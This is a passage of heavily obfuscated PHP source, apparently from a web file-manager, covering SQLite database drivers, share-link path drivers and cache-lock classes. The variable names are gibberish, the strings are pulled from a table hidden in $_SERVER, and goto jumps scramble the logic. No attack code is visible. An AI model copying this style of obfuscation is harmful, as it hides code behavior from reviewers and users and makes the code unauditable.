$a˜½ï‹×µê->newInstanceArgs($càôÜšº‘à); } return $this->{$cÓ„Ì¤†¶Š}; } protected function assign($FºÅ…®ù†Æ, $D©öŠêÍ“ƒ) { $this->values[$FºÅ…®ù†Æ] = $D©öŠêÍ“ƒ; } protected function display($Eˆ‘Ü”÷Â») { ob_end_clean(); extract($this->values); require $this->tpl . $Eˆ‘Ü”÷Â»; } } class DbSqliteBase extends Db { public function __construct($D¯ÚöØâİ = '') { $Bì×ÏĞ˜ =& $_SERVER[…ë˜õ]; if (!extension_loaded($Bì×ÏĞ˜[9])) { think_exception(think_lang($Bì×ÏĞ˜[10]) . $Bì×ÏĞ˜[11]); } if (!empty($D¯ÚöØâİ)) { if (!isset($D¯ÚöØâİ[$Bì×ÏĞ˜[12]])) { $D¯ÚöØâİ[$Bì×ÏĞ˜[12]] = 438; } $this->config = $D¯ÚöØâİ; if (empty($this->config[$Bì×ÏĞ˜[13]])) { $this->config[$Bì×ÏĞ˜[13]] = array(); } } } public function connect($FĞî©» = '', $f¬ŞÕÜäÁ = 0) { $Dæ©ôÇ Š¶ =& $_SERVER[…ë˜õ]; if (!isset($this->linkID[$f¬ŞÕÜäÁ])) { goto CÀ‹ŸùŒÕ; CÀ‹ŸùŒÕ: if (empty($FĞî©»)) { $FĞî©» = $this->config; } $B«Ç£©„šÙ = !empty($FĞî©»[$Dæ©ôÇ Š¶[13]][$Dæ©ôÇ Š¶[14]]) ? $FĞî©»[$Dæ©ôÇ Š¶[13]][$Dæ©ôÇ Š¶[14]] : $this->pconnect; $F©ìª™ªˆÖ = $B«Ç£©„šÙ ? $Dæ©ôÇ Š¶[15] : $Dæ©ôÇ Š¶[16]; goto f´Û¸ÏÑó«; f´Û¸ÏÑó«: $this->linkID[$f¬ŞÕÜäÁ] = $F©ìª™ªˆÖ($FĞî©»[$Dæ©ôÇ Š¶[17]], $FĞî©»[$Dæ©ôÇ Š¶[12]]); if (!$this->linkID[$f¬ŞÕÜäÁ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Bä½ºª Ë³; Bä½ºª Ë³: @sqlite_busy_timeout($this->linkID[$f¬ŞÕÜäÁ], 30000); if (1 != think_config($Dæ©ôÇ Š¶[18])) { unset($this->config); } goto EÑÖİõ¢×à; EÑÖİõ¢×à: } return $this->linkID[$f¬ŞÕÜäÁ]; } public function free() { $this->queryID = null; } public function query($B–ë­¥Î) { goto cØîÉ¡Û«°; b‚‹øë×¶ç: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $d°é¥Ë§âß = $this->getAll(); return $d°é¥Ë§âß; } goto fÛÏšŞó­; eÆ±Êù¥­: think_status($C¦‘Á Ï×ê[20]); $this->queryID = sqlite_query($this->_linkID, $B–ë­¥Î); $this->debug(); goto b‚‹øë×¶ç; aëÒáíŠÙ: $this->queryStr = $B–ë­¥Î; if ($this->queryID) { $this->free(); } think_action_status($C¦‘Á Ï×ê[19], 1); goto eÆ±Êù¥­; cØîÉ¡Û«°: $C¦‘Á Ï×ê =& $_SERVER[…ë˜õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aëÒáíŠÙ; fÛÏšŞó­: } public function execute($CÔÂ¦§¾Š¶) { goto BÛ«¬³‚Ç…; dŸœ„œ¯õ‹: think_status($fŞÃÂÍî¿½[20]); $bô¾àÇîÃà = sqlite_exec($this->_linkID, $CÔÂ¦§¾Š¶); $this->debug(); goto D‚ÓÍîÏ£ë; BÛ«¬³‚Ç…: $fŞÃÂÍî¿½ =& $_SERVER[…ë˜õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e”ƒƒŒ‘°; e”ƒƒŒ‘°: $this->queryStr = $CÔÂ¦§¾Š¶; if ($this->queryID) { $this->free(); } think_action_status($fŞÃÂÍî¿½[21], 1); goto dŸœ„œ¯õ‹; D‚ÓÍîÏ£ë: if (!1 === $bô¾àÇîÃà) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto føÛ·¡™ìë; føÛ·¡™ìë: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[…ë˜õ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F°¸ŒµàïÓ = sqlite_query($this->_linkID, $_SERVER[…ë˜õ][23]); if (!$F°¸ŒµàïÓ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D‚°ÀÜî÷é = sqlite_query($this->_linkID, $_SERVER[…ë˜õ][24]); if (!$D‚°ÀÜî÷é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dïçìÄß„Ò = array(); if ($this->numRows > 0) { for ($B«ğåŒÕìá = 0; $B«ğåŒÕìá < $this->numRows; $B«ğåŒÕìá++) { $dïçìÄß„Ò[$B«ğåŒÕìá] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $dïçìÄß„Ò; } public function getFields($E¿ØËä¼£) { $DÒÉ …®› =& $_SERVER[…ë˜õ]; $EÊ‘²Š‰äª = $this->query($DÒÉ …®›[25] . $E¿ØËä¼£ . $DÒÉ …®›[26]); $DİŒô±´»Š = array(); if ($EÊ‘²Š‰äª) { foreach ($EÊ‘²Š‰äª as $e„»ïã­ŠË => $B¨†ôÜ´õ‰) { $DİŒô±´»Š[$B¨†ôÜ´õ‰[$DÒÉ …®›[27]]] = array($DÒÉ …®›[28] => $B¨†ôÜ´õ‰[$DÒÉ …®›[27]], $DÒÉ …®›[29] => $B¨†ôÜ´õ‰[$DÒÉ …®›[30]], $DÒÉ …®›[31] => (bool) ($B¨†ôÜ´õ‰[$DÒÉ …®›[32]] === $DÒÉ …®›[33]), $DÒÉ …®›[34] => $B¨†ôÜ´õ‰[$DÒÉ …®›[35]], $DÒÉ …®›[36] => strtolower($B¨†ôÜ´õ‰[$DÒÉ …®›[37]]) == $DÒÉ …®›[38], $DÒÉ …®›[39] => strtolower($B¨†ôÜ´õ‰[$DÒÉ …®›[40]]) == $DÒÉ …®›[41]); } } return $DİŒô±´»Š; } public function getTables($E„’›ŸÕ  = '') { $eƒù†Œ‘ =& $_SERVER[…ë˜õ]; $aÌÖ­Øå¶‡ = $this->query($eƒù†Œ‘[42] . $eƒù†Œ‘[43] . $eƒù†Œ‘[44]); $f™Å…•¡ = array(); foreach ($aÌÖ­Øå¶‡ as $CÚ®ëº¥«ç => $eŠ‘ÉÖ÷ñ›) { $f™Å…•¡[$CÚ®ëº¥«ç] = current($eŠ‘ÉÖ÷ñ›); } return $f™Å…•¡; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $cíÕÛ›² =& $_SERVER[…ë˜õ]; $cÃìö¬‡› = sqlite_last_error($this->_linkID); $this->error = $cÃìö¬‡› . $cíÕÛ›²[4] . sqlite_error_string($cÃìö¬‡›); if ($cíÕÛ›²[33] != $this->queryStr) { $this->error .= LNG($cíÕÛ›²[45]) . $this->queryStr; } think_trace($this->error, $cíÕÛ›²[33], $cíÕÛ›²[46]); return $this->error; } public function escapeString($B¼Œöç©Ã) { return sqlite_escape_string($B¼Œöç©Ã); } public function parseLimit($aªÍ¤·«èÓ) { $bº¬˜¼ŒÙÎ =& $_SERVER[…ë˜õ]; $CÀ†İ˜—øİ = $bº¬˜¼ŒÙÎ[33]; if (!empty($aªÍ¤·«èÓ)) { $aªÍ¤·«èÓ = explode($bº¬˜¼ŒÙÎ[47], $aªÍ¤·«èÓ); if (count($aªÍ¤·«èÓ) > 1) { $CÀ†İ˜—øİ .= $bº¬˜¼ŒÙÎ[48] . $aªÍ¤·«èÓ[1] . $bº¬˜¼ŒÙÎ[49] . $aªÍ¤·«èÓ[0] . $bº¬˜¼ŒÙÎ[50]; } else { $CÀ†İ˜—øİ .= $bº¬˜¼ŒÙÎ[48] . $aªÍ¤·«èÓ[0] . $bº¬˜¼ŒÙÎ[50]; } } return $CÀ†İ˜—øİ; } } class DbSqlite3Base extends Db { public function __construct($B¢”»ÚÈŒß = '') { $E«‹•Åâ£› =& $_SERVER[…ë˜õ]; if (!class_exists($E«‹•Åâ£›[51])) { think_exception(think_lang($E«‹•Åâ£›[10]) . $E«‹•Åâ£›[52]); } if (!empty($B¢”»ÚÈŒß)) { if (!isset($B¢”»ÚÈŒß[$E«‹•Åâ£›[12]])) { $B¢”»ÚÈŒß[$E«‹•Åâ£›[12]] = 438; } $this->config = $B¢”»ÚÈŒß; if (empty($this->config[$E«‹•Åâ£›[13]])) { $this->config[$E«‹•Åâ£›[13]] = array(); } } } public function connect($BÕô¸À‹¼ = '', $e’Ùˆˆ = 0) { $B£ÆÍÇÉÄ” =& $_SERVER[…ë˜õ]; if (!isset($this->linkID[$e’Ùˆˆ])) { if (empty($BÕô¸À‹¼)) { $BÕô¸À‹¼ = $this->config; } $this->linkID[$e’Ùˆˆ] = new SQLite3($BÕô¸À‹¼[$B£ÆÍÇÉÄ”[17]]); if (!$this->linkID[$e’Ùˆˆ]) { think_exception($this->linkID[$e’Ùˆˆ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$e’Ùˆˆ]->busyTimeout(30000); if (1 != think_config($B£ÆÍÇÉÄ”[18])) { unset($this->config); } } return $this->linkID[$e’Ùˆˆ]; } public function free() { $this->queryID = null; } public function query($E¥ëåí) { goto bõ§ÈœÎù¼; fÏíÆ¡àÑš: if (!1 === $this->queryID) { $this->error(); return !1; } else { $B›ò»ÑÈÅğ = $this->getAll(); $this->numRows = count($B›ò»ÑÈÅğ); return $B›ò»ÑÈÅğ; } goto f˜¢÷µë”; C‚Ä²ôƒñŸ: think_status($CÕÓå¾áâ[20]); $this->queryID = $this->_linkID->query($E¥ëåí); $this->debug(); goto fÏíÆ¡àÑš; a÷Şµ¥”ö: $this->queryStr = $E¥ëåí; if ($this->queryID) { $this->free(); } think_action_status($CÕÓå¾áâ[19], 1); goto C‚Ä²ôƒñŸ; bõ§ÈœÎù¼: $CÕÓå¾áâ =& $_SERVER[…ë˜õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a÷Şµ¥”ö; f˜¢÷µë”: } public function execute($EöÏÔ¢æ¤) { goto Eœõ•œÌÉ; bŠ²Éƒø§¡: think_status($d†˜ÃøÏˆô[20]); $cÜá¼‹©½ = $this->_linkID->exec($EöÏÔ¢æ¤); $this->debug(); goto bÑ²í ßâ; Eœõ•œÌÉ: $d†˜ÃøÏˆô =& $_SERVER[…ë˜õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÁ¾öÄ‚—É; bÑ²í ßâ: if (!1 === $cÜá¼‹©½) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto F­ÁÊ–ãÌì; eÁ¾öÄ‚—É: $this->queryStr = $EöÏÔ¢æ¤; if ($this->queryID) { $this->free(); } think_action_status($d†˜ÃøÏˆô[21], 1); goto bŠ²Éƒø§¡; F­ÁÊ–ãÌì: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[…ë˜õ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÛ•Õ–Ï = $this->_linkID->query($_SERVER[…ë˜õ][23]); if (!$dÛ•Õ–Ï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÆ…”‡Ç¼× = $this->_linkID->query($_SERVER[…ë˜õ][24]); if (!$eÆ…”‡Ç¼×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Bâ½ªò•‘Ş = array(); while ($D¬§…æâ‰Í = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Bâ½ªò•‘Ş[] = $D¬§…æâ‰Í; } $this->queryID->reset(); return $Bâ½ªò•‘Ş; } public function getFields($bÅôÔŞˆ·) { $Fâ±ÜŞ‹Ûó =& $_SERVER[…ë˜õ]; $A‹ˆÁÖ¤î = $this->query($Fâ±ÜŞ‹Ûó[25] . $bÅôÔŞˆ· . $Fâ±ÜŞ‹Ûó[26]); $fš÷Ã½´ƒ = array(); if ($A‹ˆÁÖ¤î) { foreach ($A‹ˆÁÖ¤î as $f­Šƒ¯ˆ° => $BŞšá˜Ãº¤) { $fš÷Ã½´ƒ[$BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[28]]] = array($Fâ±ÜŞ‹Ûó[28] => $BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[28]], $Fâ±ÜŞ‹Ûó[29] => $BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[29]], $Fâ±ÜŞ‹Ûó[31] => (bool) ($BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[31]] === $Fâ±ÜŞ‹Ûó[33]), $Fâ±ÜŞ‹Ûó[34] => $BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[53]], $Fâ±ÜŞ‹Ûó[36] => (bool) $BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[54]], $Fâ±ÜŞ‹Ûó[39] => (bool) $BŞšá˜Ãº¤[$Fâ±ÜŞ‹Ûó[54]]); } } return $fš÷Ã½´ƒ; } public function getTables($cö‘¡¿Òõø = '') { $dÈÒ‡¯›‹ =& $_SERVER[…ë˜õ]; $aå¬æàã = $this->query($dÈÒ‡¯›‹[42] . $dÈÒ‡¯›‹[43] . $dÈÒ‡¯›‹[44]); $b†ÚÑ½ä© = array(); foreach ($aå¬æàã as $eá™±Ü® => $fËÎßÏÏ ) { $b†ÚÑ½ä©[$eá™±Ü®] = current($fËÎßÏÏ ); } return $b†ÚÑ½ä©; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bé®ŸÕ³ÉÒ =& $_SERVER[…ë˜õ]; $this->error = $this->_linkID->lastErrorMsg(); if ($bé®ŸÕ³ÉÒ[33] != $this->queryStr) { $this->error .= LNG($bé®ŸÕ³ÉÒ[45]) . $this->queryStr; } think_trace($this->error, $bé®ŸÕ³ÉÒ[33], $bé®ŸÕ³ÉÒ[46]); return $this->error; } public function escapeString($EÛá¯İ­¨í) { $DòãÁ¼®†İ =& $_SERVER[…ë˜õ]; if ($this->_linkID) { return $this->_linkID->escapeString($EÛá¯İ­¨í); } return str_ireplace($DòãÁ¼®†İ[55], $DòãÁ¼®†İ[56], $EÛá¯İ­¨í); } public function parseLimit($Fñ‹ĞùœĞ) { $F´ŒÖ÷ŒáÛ =& $_SERVER[…ë˜õ]; $DØ±ÉÈò³ = $F´ŒÖ÷ŒáÛ[33]; if (!empty($Fñ‹ĞùœĞ)) { $Fñ‹ĞùœĞ = explode($F´ŒÖ÷ŒáÛ[47], $Fñ‹ĞùœĞ); if (count($Fñ‹ĞùœĞ) > 1) { $DØ±ÉÈò³ .= $F´ŒÖ÷ŒáÛ[48] . $Fñ‹ĞùœĞ[1] . $F´ŒÖ÷ŒáÛ[49] . $Fñ‹ĞùœĞ[0] . $F´ŒÖ÷ŒáÛ[50]; } else { $DØ±ÉÈò³ .= $F´ŒÖ÷ŒáÛ[48] . $Fñ‹ĞùœĞ[0] . $F´ŒÖ÷ŒáÛ[50]; } } return $DØ±ÉÈò³; } } goto EÇ¬±ğÆ†ª; a†œ¬Ö™º: class PathDriverDbShareLink extends PathDriverDB { public function __construct($b¾¸®¬Ó–Â) { $this->pathParse = $b¾¸®¬Ó–Â; $this->model = Model($_SERVER[…ë˜õ][1209]); } protected function infoParse($FíÃÚÏ†ãï, $eˆ¶ìÀêŞ = false, $c¯ôõÄÄÀ‹ = false) { $B§áÍ±Ÿ°ß =& $_SERVER[…ë˜õ]; return Action($B§áÍ±Ÿ°ß[1075])->sharePathInfo($this->pathParse[$B§áÍ±Ÿ°ß[75]], !0); } public function listPath($cÔöÏ˜Œ‡á, $eŒ¾Šä–Ş¥ = false) { $fäš‚÷ìë =& $_SERVER[…ë˜õ]; $cÔ …óİÚ = parent::listPath($cÔöÏ˜Œ‡á, $eŒ¾Šä–Ş¥); foreach ($cÔ …óİÚ as $d‡‚ë£‡å => $C‡ÇÎ°¸Êœ) { if (!in_array($d‡‚ë£‡å, array($fäš‚÷ìë[73], $fäš‚÷ìë[74]))) { continue; } foreach ($C‡ÇÎ°¸Êœ as $FÅ³Ö‚„ ä => $c’ÙİÎ‰Ïï) { $cÔ …óİÚ[$d‡‚ë£‡å][$FÅ³Ö‚„ ä] = Action($fäš‚÷ìë[1075])->shareItemInfo($c’ÙİÎ‰Ïï); } } return $cÔ …óİÚ; } public function listAll($eÜ¥•öƒ†ì) { goto EÚÌ×“µˆà; EÚÌ×“µˆà: $D‰—íøË” =& $_SERVER[…ë˜õ]; $CŞÅÎô–ÜÆ = IO::info($this->pathParse[$D‰—íøË”[75]]); if (!$CŞÅÎô–ÜÆ) { return array(); } goto féƒœ—¥â¼; eã•ù‚½…Æ: return $C§Ò¯¹¿íÛ; goto Då—Ï–¨¥; féƒœ—¥â¼: $C§Ò¯¹¿íÛ = $this->model->listAll($eÜ¥•öƒ†ì); foreach ($C§Ò¯¹¿íÛ as &$B‰ÕÅ‘±¾) { $B‰ÕÅ‘±¾[$D‰—íøË”[84]] = Action($D‰—íøË”[1075])->shareItemInfo($B‰ÕÅ‘±¾[$D‰—íøË”[84]]); } unset($B‰ÕÅ‘±¾); goto eã•ù‚½…Æ; Då—Ï–¨¥: } } class PathDriverDriverShareItem { public function __construct($d ’—î‹øÈ) { $this->pathParse = $d ’—î‹øÈ; } public function __call($dÏ˜è×Ø¦, $d”áŠË¸Ÿ) { $A²ÄƒŸî =& $_SERVER[…ë˜õ]; if (method_exists($this, $dÏ˜è×Ø¦)) { return; } $f­öå’ ‘ = call_user_func_array(array($A²ÄƒŸî[1219], $dÏ˜è×Ø¦), $d”áŠË¸Ÿ); $fìÆéÚµ÷ = array($A²ÄƒŸî[1220], $A²ÄƒŸî[1221], $A²ÄƒŸî[1222], $A²ÄƒŸî[1223], $A²ÄƒŸî[513], $A²ÄƒŸî[515], $A²ÄƒŸî[1224], $A²ÄƒŸî[106], $A²ÄƒŸî[1225], $A²ÄƒŸî[1226]); if (in_array($dÏ˜è×Ø¦, $fìÆéÚµ÷)) { $f­öå’ ‘ = $this->getPathOuter($f­öå’ ‘); } return $f­öå’ ‘; } public function copy($bºƒ Ù…, $d¶§¨°±Ë³, $AÊøÈƒçŠ¾ = false) { return $this->copyMove($bºƒ Ù…, $d¶§¨°±Ë³, $AÊøÈƒçŠ¾, $_SERVER[…ë˜õ][513]); } public function move($F¹ø§²ˆ·, $bÌœ‘±°óß, $b¦Í¶ëÎÂˆ = false) { return $this->copyMove($F¹ø§²ˆ·, $bÌœ‘±°óß, $b¦Í¶ëÎÂˆ, $_SERVER[…ë˜õ][515]); } private function copyMove($f³¤‘îß† , $CŒÒé²ºÆ, $bç”æİŸÅ, $AÂ§ÓÆíÙø) { goto B‡ºóÊ„ôÅ; EŒ™„ëÅÍä: return $f¼¤œƒ´“¶; goto d’›—‰—ô¦; a¸‡ÂµŠ¯˜: if ($E¨—ƒ¡Ì†ò->pathParse[$d­‚ÀÔåŞ±[1053]]) { $CŒÒé²ºÆ = $E¨—ƒ¡Ì†ò->pathParse[$d­‚ÀÔåŞ±[1053]]; } else { $CŒÒé²ºÆ = $cÂ«åæ´œ; } $f¼¤œƒ´“¶ = IO::copyMove($f³¤‘îß† , $CŒÒé²ºÆ, $bç”æİŸÅ, $AÂ§ÓÆíÙø); $f¼¤œƒ´“¶ = $this->getPathOuter($f¼¤œƒ´“¶); goto EŒ™„ëÅÍä; B‡ºóÊ„ôÅ: $d­‚ÀÔåŞ± =& $_SERVER[…ë˜õ]; $cÂ«åæ´œ = $CŒÒé²ºÆ; $E¨—ƒ¡Ì†ò = IO::driverMake($CŒÒé²ºÆ); goto a¸‡ÂµŠ¯˜; d’›—‰—ô¦: } public function pathThis($CÀ¥„Ïôš¨) { return get_path_this($this->pathParse[$_SERVER[…ë˜õ][75]]); } public function pathFather($B¿ƒëÓÌÆâ) { return get_path_father($this->pathParse[$_SERVER[…ë˜õ][75]]); } public function iconvSystem($FéáâªÃ…ò) { return $FéáâªÃ…ò; } protected function infoParse($FöªàìÄ¬Ê, $E‚ëàÊØ…ç = false) { $Dƒá’ê–° =& $_SERVER[…ë˜õ]; $FĞøÖ±¨ä• = $this->pathParse[$Dƒá’ê–°[460]][$Dƒá’ê–°[1076]] . $this->pathParse[$Dƒá’ê–°[1069]]; if ($E‚ëàÊØ…ç) { $aÃêÃ¯—ö¹ = IO::infoWithChildren($FĞøÖ±¨ä•); } else { $aÃêÃ¯—ö¹ = IO::info($FĞøÖ±¨ä•); } $fË„áÆøĞ¹ = $this->pathParse[$Dƒá’ê–°[460]]; return Action($Dƒá’ê–°[1218])->_shareItemeParse($aÃêÃ¯—ö¹, $fË„áÆøĞ¹); } public function listAll($d×›†Ç”) { $E‚ˆ˜ËÎ =& $_SERVER[…ë˜õ]; $bŸà»¥Ç³² = IO::listAll($d×›†Ç”); $CÔÜ•ÛÅ‡ = $this->pathParse[$E‚ˆ˜ËÎ[460]]; foreach ($bŸà»¥Ç³² as &$e£½™Ò¹Áì) { check_abort(); $c…ì‘Á¤¥· = IO::info($e£½™Ò¹Áì[$E‚ˆ˜ËÎ[75]]); $c…ì‘Á¤¥· = is_array($c…ì‘Á¤¥·) ? $c…ì‘Á¤¥· : array(); $e£½™Ò¹Áì = array_merge($c…ì‘Á¤¥·, $e£½™Ò¹Áì); $e£½™Ò¹Áì[$E‚ˆ˜ËÎ[84]] = Action($E‚ˆ˜ËÎ[1218])->_shareItemeParse($e£½™Ò¹Áì, $CÔÜ•ÛÅ‡); } unset($e£½™Ò¹Áì); return $bŸà»¥Ç³²; } public function getPathOuter($Bì‚—©›Ğ‚) { goto d³ˆ‹¡³¶·; a‰âÎÁÉÒ: if (substr($d–Îáä¡», 0, strlen($CÜ½¥à¾ö)) != $CÜ½¥à¾ö) { return !1; } return $this->pathParse[$A»¢Ã¾ã‘[1070]] . $A»¢Ã¾ã‘[8] . ltrim($d²‡ğ¹¹ÑÜ, $A»¢Ã¾ã‘[8]); goto CÏ„îŒš‚†; F…³Âë°é¹: $d–Îáä¡» = KodIO::clear($Bì‚—©›Ğ‚); $CÜ½¥à¾ö = KodIO::clear($this->pathParse[$A»¢Ã¾ã‘[460]][$A»¢Ã¾ã‘[1076]]); $d²‡ğ¹¹ÑÜ = substr($d–Îáä¡», strlen($CÜ½¥à¾ö)); goto a‰âÎÁÉÒ; d³ˆ‹¡³¶·: $A»¢Ã¾ã‘ =& $_SERVER[…ë˜õ]; $A—Î÷ˆÙØÉ = KodIO::parse($Bì‚—©›Ğ‚); if ($A—Î÷ˆÙØÉ[$A»¢Ã¾ã‘[29]] == KodIO::KOD_SHARE_ITEM) { return $A—Î÷ˆÙØÉ[$A»¢Ã¾ã‘[75]]; } goto F…³Âë°é¹; CÏ„îŒš‚†: } public function getType() { $EñÏÇåªà“ =& $_SERVER[…ë˜õ]; $dµÌŒ–Ôé = str_replace($EñÏÇåªà“[71], $EñÏÇåªà“[33], get_class($this)); return strtolower($dµÌŒ–Ôé); } public function isTypeObject($F·¿‰½İéÈ) { return IO::isTypeObject($F·¿‰½İéÈ); } public function info($b½Ü‹÷°åò) { return $this->infoParse($b½Ü‹÷°åò); } public function infoAuth($EŠšÑ•¶£) { return $this->infoParse($EŠšÑ•¶£); } public function infoWithChildren($e‚ùñÏÈ·) { return $this->infoParse($e‚ùñÏÈ·, !0); } public function infoFull($aöÂñšœ²) { return $this->infoParse($aöÂñšœ²); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($eóÉÓÑ’Î¯) { $this->pathParse = $eóÉÓÑ’Î¯; } protected function infoParse($EáÍ®í’„, $Bê±àòç… = false) { $B³•»‹Ò–ø =& $_SERVER[…ë˜õ]; return Action($B³•»‹Ò–ø[1075])->sharePathInfo($this->pathParse[$B³•»‹Ò–ø[75]], !0, $Bê±àòç…); } public function listPath($bëŠåŠùŞİ, $dì²Úñ·² = false) { $CšÕ¢Ş‰¶Í =& $_SERVER[…ë˜õ]; $Dì¶ƒäÙêÙ = IO::listPath($bëŠåŠùŞİ, $dì²Úñ·²); foreach ($Dì¶ƒäÙêÙ as $dš•¾¿‘°® => $f™“‘·Ö¦) { if (!in_array($dš•¾¿‘°®, array($CšÕ¢Ş‰¶Í[73], $CšÕ¢Ş‰¶Í[74]))) { continue; } foreach ($f™“‘·Ö¦ as $B‡ÇÃ»ôˆô => $D”“Í‚ÁÛ›) { $D”“Í‚ÁÛ› = Action($CšÕ¢Ş‰¶Í[1227])->parsePathChildren($D”“Í‚ÁÛ›, array($CšÕ¢Ş‰¶Í[408] => $bëŠåŠùŞİ)); $Dì¶ƒäÙêÙ[$dš•¾¿‘°®][$B‡ÇÃ»ôˆô] = Action($CšÕ¢Ş‰¶Í[1075])->shareItemInfo($D”“Í‚ÁÛ›); } } return $Dì¶ƒäÙêÙ; } public function listAll($D–ˆ£ÉïÛ…) { $eì×ç‘œâ =& $_SERVER[…ë˜õ]; $a¥š²å‚‚ = IO::listAll($D–ˆ£ÉïÛ…); foreach ($a¥š²å‚‚ as &$Bõ…Á¤Ğõ) { $DˆŸòŠää· = IO::info($Bõ…Á¤Ğõ[$eì×ç‘œâ[75]]); $DˆŸòŠää· = is_array($DˆŸòŠää·) ? $DˆŸòŠää· : array(); $Bõ…Á¤Ğõ = array_merge($DˆŸòŠää·, $Bõ…Á¤Ğõ); $Bõ…Á¤Ğõ[$eì×ç‘œâ[84]] = Action($eì×ç‘œâ[1075])->shareItemInfo($Bõ…Á¤Ğõ); } unset($Bõ…Á¤Ğõ); return $a¥š²å‚‚; } } goto eíŸÖ‰Ö©; d¹ãàÊšÄ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a¢„îĞ¸”“ =& $_SERVER[…ë˜õ]; $ağá‰÷°ø¿ = $GLOBALS[$a¢„îĞ¸”“[6]][$a¢„îĞ¸”“[345]]; self::$cachePath = $ağá‰÷°ø¿[$a¢„îĞ¸”“[191]][$a¢„îĞ¸”“[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($cœ¦…õà¬, $DÇù®˜µ°‚ = 0) { goto ašî¾Ì–¶Ã; Cß´ŠóÉ›ñ: $E‹¯ˆ©¸ò¸ = rtrim(self::$cachePath, $eÎÉáÚëøö[8]) . $eÎÉáÚëøö[831] . md5($cœ¦…õà¬) . $eÎÉáÚëøö[821]; if (file_exists($E‹¯ˆ©¸ò¸) && filemtime($E‹¯ˆ©¸ò¸) && filemtime($E‹¯ˆ©¸ò¸) < time() - 10) { @unlink($E‹¯ˆ©¸ò¸); } do { if (file_exists($E‹¯ˆ©¸ò¸)) { cacheLockWait(); continue; } $fƒÈ–”È–Ÿ = fopen($E‹¯ˆ©¸ò¸, $eÎÉáÚëøö[832]); if (!$fƒÈ–”È–Ÿ) { return !1; } $fŒ˜„Ö¥Óˆ = flock($fƒÈ–”È–Ÿ, LOCK_EX | LOCK_NB); self::$caches[$cœ¦…õà¬] = array($eÎÉáÚëøö[833] => $fƒÈ–”È–Ÿ, $eÎÉáÚëøö[191] => $E‹¯ˆ©¸ò¸); fwrite($fƒÈ–”È–Ÿ, $a™ÛÃÕ«ªŞ); clearstatcache(); if ($fƒÈ–”È–Ÿ && $fŒ˜„Ö¥Óˆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $a™ÛÃÕ«ªŞ); goto Bê¥ƒ«¤‘Ç; Bê¥ƒ«¤‘Ç: $this->unlock($cœ¦…õà¬); return !1; goto fó„ëÉ¿‹Â; ašî¾Ì–¶Ã: $eÎÉáÚëøö =& $_SERVER[…ë˜õ]; $Cƒƒ´õ‰Ç = microtime(!0); $a™ÛÃÕ«ªŞ = $Cƒƒ´õ‰Ç + $DÇù®˜µ°‚ + 0.0001; goto Cß´ŠóÉ›ñ; fó„ëÉ¿‹Â: } public function lockGet($Eƒìù¯·«ë) { $c¢‘×øÖéÖ =& $_SERVER[…ë˜õ]; $f°Íáêæò = rtrim(self::$cachePath, $c¢‘×øÖéÖ[8]) . $c¢‘×øÖéÖ[831] . md5($Eƒìù¯·«ë) . $c¢‘×øÖéÖ[821]; return file_exists($f°Íáêæò); } public function unlock($DĞ×ÓìŸ¨•) { goto cˆ›Ñ™÷¤; cª÷‚ß–¯¿: @flock($AŞÇƒİíÕ¥[$D²ë¬ŞÚ[833]], LOCK_UN); @fclose($AŞÇƒİíÕ¥[$D²ë¬ŞÚ[833]]); @unlink($AŞÇƒİíÕ¥[$D²ë¬ŞÚ[191]]); goto d—ÃÛ“×›å; d—ÃÛ“×›å: unset(self::$caches[$DĞ×ÓìŸ¨•]); goto C˜·Ø¦é¿Õ; cˆ›Ñ™÷¤: $D²ë¬ŞÚ =& $_SERVER[…ë˜õ]; $AŞÇƒİíÕ¥ = self::$caches[$DĞ×ÓìŸ¨•]; if (!$AŞÇƒİíÕ¥) { return; } goto cª÷‚ß–¯¿; C˜·Ø¦é¿Õ: } } class CacheLockRedis { public function lock($Aä­¥Ë»¿Á, $dñ¸ÌÒÚ¤í = 10) { $b¦â™§Èâ– = Cache::init(); $fÁŸ’¡§‡¦ = microtime(!0) + $dñ¸ÌÒÚ¤í; while (microtime(!0) < $fÁŸ’¡§‡¦) { $eÅØÄ¶Âê™ = $b¦â™§Èâ–->get($Aä­¥Ë»¿Á); if (!$eÅØÄ¶Âê™) { 